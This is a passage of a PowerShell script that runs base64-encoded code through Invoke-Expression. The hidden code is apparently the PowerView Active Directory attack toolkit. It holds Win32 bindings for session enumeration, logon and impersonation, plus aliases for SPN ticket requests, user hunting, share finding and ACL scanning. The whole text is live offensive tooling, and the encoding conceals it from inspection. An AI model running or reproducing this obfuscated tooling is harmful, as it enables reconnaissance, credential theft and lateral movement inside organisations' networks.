1lbWJlciBOb3RlcHJvcGVydHkgJ0FEU1BhdGgnICRncG8uUHJvcGVydGllcy5hZHNwYXRoCiAgICAgICAgICAgICRHcG9BQ0wgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPRGlzcGxheU5hbWUnICRncG8uUHJvcGVydGllcy5kaXNwbGF5bmFtZQogICAgICAgICAgICAkR3BvQUNMIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lkZW50aXR5UmVmZXJlbmNlJyAkQUNMLklkZW50aXR5UmVmZXJlbmNlCiAgICAgICAgICAgICRHcG9BQ0wgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQWN0aXZlRGlyZWN0b3J5UmlnaHRzJyAkQUNMLkFjdGl2ZURpcmVjdG9yeVJpZ2h0cwogICAgICAgICAgICAkR3BvQUNMCiAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE1vZCA9IE5ldy1Jbk1lbW9yeU1vZHVsZSAtTW9kdWxlTmFtZSBXaW4zMgokU2FtQWNjb3VudFR5cGVFbnVtID0gcHNlbnVtICRNb2QgUG93ZXJWaWV3LlNhbUFjY291bnRUeXBlRW51bSBVSW50MzIgQHsKICAgIERPTUFJTl9PQkpFQ1QgICAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDAwJwogICAgR1JPVVBfT0JKRUNUICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MTAwMDAwMDAnCiAgICBOT05fU0VDVVJJVFlfR1JPVVBfT0JKRUNUICAgICAgID0gICAnMHgxMDAwMDAwMScKICAgIEFMSUFTX09CSkVDVCAgICAgICAgICAgICAgICAgICAgPSAgICcweDIwMDAwMDAwJwogICAgTk9OX1NFQ1VSSVRZX0FMSUFTX09CSkVDVCAgICAgICA9ICAgJzB4MjAwMDAwMDEnCiAgICBVU0VSX09CSkVDVCAgICAgICAgICAgICAgICAgICAgID0gICAnMHgzMDAwMDAwMCcKICAgIE1BQ0hJTkVfQUNDT1VOVCAgICAgICAgICAgICAgICAgPSAgICcweDMwMDAwMDAxJwogICAgVFJVU1RfQUNDT1VOVCAgICAgICAgICAgICAgICAgICA9ICAgJzB4MzAwMDAwMDInCiAgICBBUFBfQkFTSUNfR1JPVVAgICAgICAgICAgICAgICAgID0gICAnMHg0MDAwMDAwMCcKICAgIEFQUF9RVUVSWV9HUk9VUCAgICAgICAgICAgICAgICAgPSAgICcweDQwMDAwMDAxJwogICAgQUNDT1VOVF9UWVBFX01BWCAgICAgICAgICAgICAgICA9ICAgJzB4N2ZmZmZmZmYnCn0KJEdyb3VwVHlwZUVudW0gPSBwc2VudW0gJE1vZCBQb3dlclZpZXcuR3JvdXBUeXBlRW51bSBVSW50MzIgQHsKICAgIENSRUFURURfQllfU1lTVEVNICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDAxJwogICAgR0xPQkFMX1NDT1BFICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMDInCiAgICBET01BSU5fTE9DQUxfU0NPUEUgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAwNCcKICAgIFVOSVZFUlNBTF9TQ09QRSAgICAgICAgICAgICAgICAgPSAgICcweDAwMDAwMDA4JwogICAgQVBQX0JBU0lDICAgICAgICAgICAgICAgICAgICAgICA9ICAgJzB4MDAwMDAwMTAnCiAgICBBUFBfUVVFUlkgICAgICAgICAgICAgICAgICAgICAgID0gICAnMHgwMDAwMDAyMCcKICAgIFNFQ1VSSVRZICAgICAgICAgICAgICAgICAgICAgICAgPSAgICcweDgwMDAwMDAwJwp9IC1CaXRmaWVsZAokVUFDRW51bSA9IHBzZW51bSAkTW9kIFBvd2VyVmlldy5VQUNFbnVtIFVJbnQzMiBAewogICAgU0NSSVBUICAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMQogICAgQUNDT1VOVERJU0FCTEUgICAgICAgICAgICAgICAgICA9ICAgMgogICAgSE9NRURJUl9SRVFVSVJFRCAgICAgICAgICAgICAgICA9ICAgOAogICAgTE9DS09VVCAgICAgICAgICAgICAgICAgICAgICAgICA9ICAgMTYKICAgIFBBU1NXRF9OT1RSRVFEICAgICAgICAgICAgICAgICAgPSAgIDMyCiAgICBQQVNTV0RfQ0FOVF9DSEFOR0UgICAgICAgICAgICAgID0gICA2NAogICAgRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQgICAgICA9ICAgMTI4CiAgICBURU1QX0RVUExJQ0FURV9BQ0NPVU5UICAgICAgICAgID0gICAyNTYKICAgIE5PUk1BTF9BQ0NPVU5UICAgICAgICAgICAgICAgICAgPSAgIDUxMgogICAgSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgMjA0OAogICAgV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCAgICAgICA9ICAgNDA5NgogICAgU0VSVkVSX1RSVVNUX0FDQ09VTlQgICAgICAgICAgICA9ICAgODE5MgogICAgRE9OVF9FWFBJUkVfUEFTU1dPUkQgICAgICAgICAgICA9ICAgNjU1MzYKICAgIE1OU19MT0dPTl9BQ0NPVU5UICAgICAgICAgICAgICAgPSAgIDEzMTA3MgogICAgU01BUlRDQVJEX1JFUVVJUkVEICAgICAgICAgICAgICA9ICAgMjYyMTQ0CiAgICBUUlVTVEVEX0ZPUl9ERUxFR0FUSU9OICAgICAgICAgID0gICA1MjQyODgKICAgIE5PVF9ERUxFR0FURUQgICAgICAgICAgICAgICAgICAgPSAgIDEwNDg1NzYKICAgIFVTRV9ERVNfS0VZX09OTFkgICAgICAgICAgICAgICAgPSAgIDIwOTcxNTIKICAgIERPTlRfUkVRX1BSRUFVVEggICAgICAgICAgICAgICAgPSAgIDQxOTQzMDQKICAgIFBBU1NXT1JEX0VYUElSRUQgICAgICAgICAgICAgICAgPSAgIDgzODg2MDgKICAgIFRSVVNURURfVE9fQVVUSF9GT1JfREVMRUdBVElPTiAgPSAgIDE2Nzc3MjE2CiAgICBQQVJUSUFMX1NFQ1JFVFNfQUNDT1VOVCAgICAgICAgID0gICA2NzEwODg2NAp9IC1CaXRmaWVsZAokV1RTQ29ubmVjdFN0YXRlID0gcHNlbnVtICRNb2QgV1RTX0NPTk5FQ1RTVEFURV9DTEFTUyBVSW50MTYgQHsKICAgIEFjdGl2ZSAgICAgICA9ICAgIDAKICAgIENvbm5lY3RlZCAgICA9ICAgIDEKICAgIENvbm5lY3RRdWVyeSA9ICAgIDIKICAgIFNoYWRvdyAgICAgICA9ICAgIDMKICAgIERpc2Nvbm5lY3RlZCA9ICAgIDQKICAgIElkbGUgICAgICAgICA9ICAgIDUKICAgIExpc3RlbiAgICAgICA9ICAgIDYKICAgIFJlc2V0ICAgICAgICA9ICAgIDcKICAgIERvd24gICAgICAgICA9ICAgIDgKICAgIEluaXQgICAgICAgICA9ICAgIDkKfQokV1RTX1NFU1NJT05fSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlJEUFNlc3Npb25JbmZvIEB7CiAgICBFeGVjRW52SWQgPSBmaWVsZCAwIFVJbnQzMgogICAgU3RhdGUgPSBmaWVsZCAxICRXVFNDb25uZWN0U3RhdGUKICAgIFNlc3Npb25JZCA9IGZpZWxkIDIgVUludDMyCiAgICBwU2Vzc2lvbk5hbWUgPSBmaWVsZCAzIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwSG9zdE5hbWUgPSBmaWVsZCA0IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwVXNlck5hbWUgPSBmaWVsZCA1IFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBwRG9tYWluTmFtZSA9IGZpZWxkIDYgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIHBGYXJtTmFtZSA9IGZpZWxkIDcgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokV1RTX0NMSUVOVF9BRERSRVNTID0gc3RydWN0ICRtb2QgV1RTX0NMSUVOVF9BRERSRVNTIEB7CiAgICBBZGRyZXNzRmFtaWx5ID0gZmllbGQgMCBVSW50MzIKICAgIEFkZHJlc3MgPSBmaWVsZCAxIEJ5dGVbXSAtTWFyc2hhbEFzIEAoJ0J5VmFsQXJyYXknLCAyMCkKfQokU0hBUkVfSU5GT18xID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlNoYXJlSW5mbyBAewogICAgTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFR5cGUgPSBmaWVsZCAxIFVJbnQzMgogICAgUmVtYXJrID0gZmllbGQgMiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CiRXS1NUQV9VU0VSX0lORk9fMSA9IHN0cnVjdCAkTW9kIFBvd2VyVmlldy5Mb2dnZWRPblVzZXJJbmZvIEB7CiAgICBVc2VyTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIExvZ29uRG9tYWluID0gZmllbGQgMSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgQXV0aERvbWFpbnMgPSBmaWVsZCAyIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBMb2dvblNlcnZlciA9IGZpZWxkIDMgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokU0VTU0lPTl9JTkZPXzEwID0gc3RydWN0ICRNb2QgUG93ZXJWaWV3LlNlc3Npb25JbmZvIEB7CiAgICBDTmFtZSA9IGZpZWxkIDAgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIFVzZXJOYW1lID0gZmllbGQgMSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgVGltZSA9IGZpZWxkIDIgVUludDMyCiAgICBJZGxlVGltZSA9IGZpZWxkIDMgVUludDMyCn0KJFNJRF9OQU1FX1VTRSA9IHBzZW51bSAkTW9kIFNJRF9OQU1FX1VTRSBVSW50MTYgQHsKICAgIFNpZFR5cGVVc2VyICAgICAgICAgICAgID0gMQogICAgU2lkVHlwZUdyb3VwICAgICAgICAgICAgPSAyCiAgICBTaWRUeXBlRG9tYWluICAgICAgICAgICA9IDMKICAgIFNpZFR5cGVBbGlhcyAgICAgICAgICAgID0gNAogICAgU2lkVHlwZVdlbGxLbm93bkdyb3VwICAgPSA1CiAgICBTaWRUeXBlRGVsZXRlZEFjY291bnQgICA9IDYKICAgIFNpZFR5cGVJbnZhbGlkICAgICAgICAgID0gNwogICAgU2lkVHlwZVVua25vd24gICAgICAgICAgPSA4CiAgICBTaWRUeXBlQ29tcHV0ZXIgICAgICAgICA9IDkKfQokTE9DQUxHUk9VUF9JTkZPXzEgPSBzdHJ1Y3QgJE1vZCBMT0NBTEdST1VQX0lORk9fMSBAewogICAgbGdycGkxX25hbWUgPSBmaWVsZCAwIFN0cmluZyAtTWFyc2hhbEFzIEAoJ0xQV1N0cicpCiAgICBsZ3JwaTFfY29tbWVudCA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMiA9IHN0cnVjdCAkTW9kIExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzIgQHsKICAgIGxncm1pMl9zaWQgPSBmaWVsZCAwIEludFB0cgogICAgbGdybWkyX3NpZHVzYWdlID0gZmllbGQgMSAkU0lEX05BTUVfVVNFCiAgICBsZ3JtaTJfZG9tYWluYW5kbmFtZSA9IGZpZWxkIDIgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokRHNEb21haW5GbGFnID0gcHNlbnVtICRNb2QgRHNEb21haW4uRmxhZ3MgVUludDMyIEB7CiAgICBJTl9GT1JFU1QgICAgICAgPSAxCiAgICBESVJFQ1RfT1VUQk9VTkQgPSAyCiAgICBUUkVFX1JPT1QgICAgICAgPSA0CiAgICBQUklNQVJZICAgICAgICAgPSA4CiAgICBOQVRJVkVfTU9ERSAgICAgPSAxNgogICAgRElSRUNUX0lOQk9VTkQgID0gMzIKfSAtQml0ZmllbGQKJERzRG9tYWluVHJ1c3RUeXBlID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RUeXBlIFVJbnQzMiBAewogICAgRE9XTkxFVkVMICAgPSAxCiAgICBVUExFVkVMICAgICA9IDIKICAgIE1JVCAgICAgICAgID0gMwogICAgRENFICAgICAgICAgPSA0Cn0KJERzRG9tYWluVHJ1c3RBdHRyaWJ1dGVzID0gcHNlbnVtICRNb2QgRHNEb21haW4uVHJ1c3RBdHRyaWJ1dGVzIFVJbnQzMiBAewogICAgTk9OX1RSQU5TSVRJVkUgICAgICA9IDEKICAgIFVQTEVWRUxfT05MWSAgICAgICAgPSAyCiAgICBGSUxURVJfU0lEUyAgICAgICAgID0gNAogICAgRk9SRVNUX1RSQU5TSVRJVkUgICA9IDgKICAgIENST1NTX09SR0FOSVpBVElPTiAgPSAxNgogICAgV0lUSElOX0ZPUkVTVCAgICAgICA9IDMyCiAgICBUUkVBVF9BU19FWFRFUk5BTCAgID0gNjQKfQokRFNfRE9NQUlOX1RSVVNUUyA9IHN0cnVjdCAkTW9kIERTX0RPTUFJTl9UUlVTVFMgQHsKICAgIE5ldGJpb3NEb21haW5OYW1lID0gZmllbGQgMCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgRG5zRG9tYWluTmFtZSA9IGZpZWxkIDEgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIEZsYWdzID0gZmllbGQgMiAkRHNEb21haW5GbGFnCiAgICBQYXJlbnRJbmRleCA9IGZpZWxkIDMgVUludDMyCiAgICBUcnVzdFR5cGUgPSBmaWVsZCA0ICREc0RvbWFpblRydXN0VHlwZQogICAgVHJ1c3RBdHRyaWJ1dGVzID0gZmllbGQgNSAkRHNEb21haW5UcnVzdEF0dHJpYnV0ZXMKICAgIERvbWFpblNpZCA9IGZpZWxkIDYgSW50UHRyCiAgICBEb21haW5HdWlkID0gZmllbGQgNyBHdWlkCn0KJE5FVFJFU09VUkNFVyA9IHN0cnVjdCAkTW9kIE5FVFJFU09VUkNFVyBAewogICAgZHdTY29wZSA9ICAgICAgICAgZmllbGQgMCBVSW50MzIKICAgIGR3VHlwZSA9ICAgICAgICAgIGZpZWxkIDEgVUludDMyCiAgICBkd0Rpc3BsYXlUeXBlID0gICBmaWVsZCAyIFVJbnQzMgogICAgZHdVc2FnZSA9ICAgICAgICAgZmllbGQgMyBVSW50MzIKICAgIGxwTG9jYWxOYW1lID0gICAgIGZpZWxkIDQgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwUmVtb3RlTmFtZSA9ICAgIGZpZWxkIDUgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwQ29tbWVudCA9ICAgICAgIGZpZWxkIDYgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKICAgIGxwUHJvdmlkZXIgPSAgICAgIGZpZWxkIDcgU3RyaW5nIC1NYXJzaGFsQXMgQCgnTFBXU3RyJykKfQokRnVuY3Rpb25EZWZpbml0aW9ucyA9IEAoCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRTaGFyZUVudW0gKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0V2tzdGFVc2VyRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRTZXNzaW9uRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldExvY2FsR3JvdXBFbnVtIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldExvY2FsR3JvdXBHZXRNZW1iZXJzIChbSW50XSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBEc0dldFNpdGVOYW1lIChbSW50XSkgQChbU3RyaW5nXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBEc0VudW1lcmF0ZURvbWFpblRydXN0cyAoW0ludF0pIEAoW1N0cmluZ10sIFtVSW50MzJdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0QXBpQnVmZmVyRnJlZSAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIGFkdmFwaTMyIENvbnZlcnRTaWRUb1N0cmluZ1NpZCAoW0ludF0pIEAoW0ludFB0cl0sIFtTdHJpbmddLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBPcGVuU0NNYW5hZ2VyVyAoW0ludFB0cl0pIEAoW1N0cmluZ10sIFtTdHJpbmddLCBbSW50XSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBDbG9zZVNlcnZpY2VIYW5kbGUgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyBhZHZhcGkzMiBMb2dvblVzZXIgKFtCb29sXSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtTdHJpbmddLCBbVUludDMyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyBhZHZhcGkzMiBJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlciAoW0Jvb2xdKSBAKFtJbnRQdHJdKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIGFkdmFwaTMyIFJldmVydFRvU2VsZiAoW0Jvb2xdKSBAKCkgLVNldExhc3RFcnJvciksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNPcGVuU2VydmVyRXggKFtJbnRQdHJdKSBAKFtTdHJpbmddKSksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNFbnVtZXJhdGVTZXNzaW9uc0V4IChbSW50XSkgQChbSW50UHRyXSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU1F1ZXJ5U2Vzc2lvbkluZm9ybWF0aW9uIChbSW50XSkgQChbSW50UHRyXSwgW0ludF0sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0ZyZWVNZW1vcnlFeCAoW0ludF0pIEAoW0ludDMyXSwgW0ludFB0cl0sIFtJbnQzMl0pKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0ZyZWVNZW1vcnkgKFtJbnRdKSBAKFtJbnRQdHJdKSksCiAgICAoZnVuYyB3dHNhcGkzMiBXVFNDbG9zZVNlcnZlciAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIE1wciBXTmV0QWRkQ29ubmVjdGlvbjJXIChbSW50XSkgQCgkTkVUUkVTT1VSQ0VXLCBbU3RyaW5nXSwgW1N0cmluZ10sIFtVSW50MzJdKSksCiAgICAoZnVuYyBNcHIgV05ldENhbmNlbENvbm5lY3Rpb24yIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtCb29sXSkpLAogICAgKGZ1bmMga2VybmVsMzIgQ2xvc2VIYW5kbGUgKFtCb29sXSkgQChbSW50UHRyXSkgLVNldExhc3RFcnJvcikKKQokVHlwZXMgPSAkRnVuY3Rpb25EZWZpbml0aW9ucyB8IEFkZC1XaW4zMlR5cGUgLU1vZHVsZSAkTW9kIC1OYW1lc3BhY2UgJ1dpbjMyJwokTmV0YXBpMzIgPSAkVHlwZXNbJ25ldGFwaTMyJ10KJEFkdmFwaTMyID0gJFR5cGVzWydhZHZhcGkzMiddCiRXdHNhcGkzMiA9ICRUeXBlc1snd3RzYXBpMzInXQokTXByID0gJFR5cGVzWydNcHInXQokS2VybmVsMzIgPSAkVHlwZXNbJ2tlcm5lbDMyJ10KU2V0LUFsaWFzIEdldC1JUEFkZHJlc3MgUmVzb2x2ZS1JUEFkZHJlc3MKU2V0LUFsaWFzIENvbnZlcnQtTmFtZVRvU2lkIENvbnZlcnRUby1TSUQKU2V0LUFsaWFzIENvbnZlcnQtU2lkVG9OYW1lIENvbnZlcnRGcm9tLVNJRApTZXQtQWxpYXMgUmVxdWVzdC1TUE5UaWNrZXQgR2V0LURvbWFpblNQTlRpY2tldApTZXQtQWxpYXMgR2V0LUROU1pvbmUgR2V0LURvbWFpbkROU1pvbmUKU2V0LUFsaWFzIEdldC1ETlNSZWNvcmQgR2V0LURvbWFpbkROU1JlY29yZApTZXQtQWxpYXMgR2V0LU5ldERvbWFpbiBHZXQtRG9tYWluClNldC1BbGlhcyBHZXQtTmV0RG9tYWluQ29udHJvbGxlciBHZXQtRG9tYWluQ29udHJvbGxlcgpTZXQtQWxpYXMgR2V0LU5ldEZvcmVzdCBHZXQtRm9yZXN0ClNldC1BbGlhcyBHZXQtTmV0Rm9yZXN0RG9tYWluIEdldC1Gb3Jlc3REb21haW4KU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RDYXRhbG9nIEdldC1Gb3Jlc3RHbG9iYWxDYXRhbG9nClNldC1BbGlhcyBHZXQtTmV0VXNlciBHZXQtRG9tYWluVXNlcgpTZXQtQWxpYXMgR2V0LVVzZXJFdmVudCBHZXQtRG9tYWluVXNlckV2ZW50ClNldC1BbGlhcyBHZXQtTmV0Q29tcHV0ZXIgR2V0LURvbWFpbkNvbXB1dGVyClNldC1BbGlhcyBHZXQtQURPYmplY3QgR2V0LURvbWFpbk9iamVjdApTZXQtQWxpYXMgU2V0LUFET2JqZWN0IFNldC1Eb21haW5PYmplY3QKU2V0LUFsaWFzIEdldC1PYmplY3RBY2wgR2V0LURvbWFpbk9iamVjdEFjbApTZXQtQWxpYXMgQWRkLU9iamVjdEFjbCBBZGQtRG9tYWluT2JqZWN0QWNsClNldC1BbGlhcyBJbnZva2UtQUNMU2Nhbm5lciBGaW5kLUludGVyZXN0aW5nRG9tYWluQWNsClNldC1BbGlhcyBHZXQtR1VJRE1hcCBHZXQtRG9tYWluR1VJRE1hcApTZXQtQWxpYXMgR2V0LU5ldE9VIEdldC1Eb21haW5PVQpTZXQtQWxpYXMgR2V0LU5ldFNpdGUgR2V0LURvbWFpblNpdGUKU2V0LUFsaWFzIEdldC1OZXRTdWJuZXQgR2V0LURvbWFpblN1Ym5ldApTZXQtQWxpYXMgR2V0LU5ldEdyb3VwIEdldC1Eb21haW5Hcm91cApTZXQtQWxpYXMgRmluZC1NYW5hZ2VkU2VjdXJpdHlHcm91cHMgR2V0LURvbWFpbk1hbmFnZWRTZWN1cml0eUdyb3VwClNldC1BbGlhcyBHZXQtTmV0R3JvdXBNZW1iZXIgR2V0LURvbWFpbkdyb3VwTWVtYmVyClNldC1BbGlhcyBHZXQtTmV0RmlsZVNlcnZlciBHZXQtRG9tYWluRmlsZVNlcnZlcgpTZXQtQWxpYXMgR2V0LURGU3NoYXJlIEdldC1Eb21haW5ERlNTaGFyZQpTZXQtQWxpYXMgR2V0LU5ldEdQTyBHZXQtRG9tYWluR1BPClNldC1BbGlhcyBHZXQtTmV0R1BPR3JvdXAgR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAKU2V0LUFsaWFzIEZpbmQtR1BPTG9jYXRpb24gR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZwpTZXQtQWxpYXMgRmluZC1HUE9Db21wdXRlckFkbWluIEdldC1Eb21haW5HUE9Db21wdXRlckxvY2FsR3JvdXBNYXBwaW5nClNldC1BbGlhcyBHZXQtTG9nZ2VkT25Mb2NhbCBHZXQtUmVnTG9nZ2VkT24KU2V0LUFsaWFzIEludm9rZS1DaGVja0xvY2FsQWRtaW5BY2Nlc3MgVGVzdC1BZG1pbkFjY2VzcwpTZXQtQWxpYXMgR2V0LVNpdGVOYW1lIEdldC1OZXRDb21wdXRlclNpdGVOYW1lClNldC1BbGlhcyBHZXQtUHJveHkgR2V0LVdNSVJlZ1Byb3h5ClNldC1BbGlhcyBHZXQtTGFzdExvZ2dlZE9uIEdldC1XTUlSZWdMYXN0TG9nZ2VkT24KU2V0LUFsaWFzIEdldC1DYWNoZWRSRFBDb25uZWN0aW9uIEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uClNldC1BbGlhcyBHZXQtUmVnaXN0cnlNb3VudGVkRHJpdmUgR2V0LVdNSVJlZ01vdW50ZWREcml2ZQpTZXQtQWxpYXMgR2V0LU5ldFByb2Nlc3MgR2V0LVdNSVByb2Nlc3MKU2V0LUFsaWFzIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIE5ldy1UaHJlYWRlZEZ1bmN0aW9uClNldC1BbGlhcyBJbnZva2UtVXNlckh1bnRlciBGaW5kLURvbWFpblVzZXJMb2NhdGlvbgpTZXQtQWxpYXMgSW52b2tlLVByb2Nlc3NIdW50ZXIgRmluZC1Eb21haW5Qcm9jZXNzClNldC1BbGlhcyBJbnZva2UtRXZlbnRIdW50ZXIgRmluZC1Eb21haW5Vc2VyRXZlbnQKU2V0LUFsaWFzIEludm9rZS1TaGFyZUZpbmRlciBGaW5kLURvbWFpblNoYXJlClNldC1BbGlhcyBJbnZva2UtRmlsZUZpbmRlciBGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlClNldC1BbGlhcyBJbnZva2UtRW51bWVyYXRlTG9jYWxBZG1pbiBGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIKU2V0LUFsaWFzIEdldC1OZXREb21haW5UcnVzdCBHZXQtRG9tYWluVHJ1c3QKU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RUcnVzdCBHZXQtRm9yZXN0VHJ1c3QKU2V0LUFsaWFzIEZpbmQtRm9yZWlnblVzZXIgR2V0LURvbWFpbkZvcmVpZ25Vc2VyClNldC1BbGlhcyBGaW5kLUZvcmVpZ25Hcm91cCBHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyClNldC1BbGlhcyBJbnZva2UtTWFwRG9tYWluVHJ1c3QgR2V0LURvbWFpblRydXN0TWFwcGluZwpTZXQtQWxpYXMgR2V0LURvbWFpblBvbGljeSBHZXQtRG9tYWluUG9saWN5RGF0YQo=")))

